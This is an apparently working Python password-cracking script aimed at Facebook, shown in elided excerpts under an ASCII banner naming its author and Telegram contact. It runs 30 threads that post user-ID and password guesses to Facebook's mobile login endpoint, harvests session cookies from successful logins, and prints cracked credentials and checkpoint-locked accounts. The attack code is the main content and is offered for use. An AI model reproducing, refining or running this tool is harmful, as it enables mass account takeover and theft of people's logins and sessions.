...
\033[1;94m╚══╩═══╩═══╩╝─╚╩══╩╝╚═╝\033[1;0m
\033[1;32m═════════════════════════════════════════════\033[1;0m
 \033[1;31mOwner  \033[1;91m  :\033[1;32m Jubair Ahmad\033[1;0m
\033[1;31m Guthub  \033[1;91m :\033[1;32m Jubairbro\033[1;0m
 \033[1;31mFacebook \033[1;91m:\033[1;32m Jubair bro\033[1;0m
\033[1;31m Taligram \033[1;91m:\033[1;32m https://t.me/jubairff\033[1;0m
 \033[1;31mTools  \033[1;91m  :\033[1;32m FREE •[version •\033[1;35mTEST\033[1;32m]\033[1;0m
\033[1;32m═════════════════════════════════════════════\033[1;0m""")
# MAIN MANU 
def Main():
        os.system("clear")
        ...
        if jubair in ["1","01"]:
            sexy()
        if jubair in ["2","02"]:
        	os.system('xdg-open https://wa.me/+8801639111636')
        if jubair in [" 0", "00"]:
            exit()
        else:
            exit()     
def sexy():
    ...
    with ThreadPool(max_workers=30) as asha:
        ...
        print('\033[1;33m[🙂\033[1;33m] \033[1;35mTO STOP THIS 👉 CTRL + z')
        print("\033[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        for love in user:
...
def jubair(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\033[1;32m[jubair-bro]\033[1;36m[%s/%s]🙂\033[1;32m[OK-%s]\033[1;35m \r'%(loop,tl,len(oks))),
            sys.stdout.flush()
	...
	'viewport-width': '980',}
            lo = session.post('https://x.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8&rtime=1693121657&hrc=1&wtsid=rdr_0pRHMSGAi6wSHN8gS&refsrc=deprecated&_rdr',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f"\033[1;33m[\033[1;32mjubair-ok \033[1;33m]\033[1;92m {uid}\033[1;95m|\033[1;92m {ps} ")
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\033[1;33m[\033[1;32mjubair-CP\033[1;33m]\033[1;91m {uid}|{ps}")
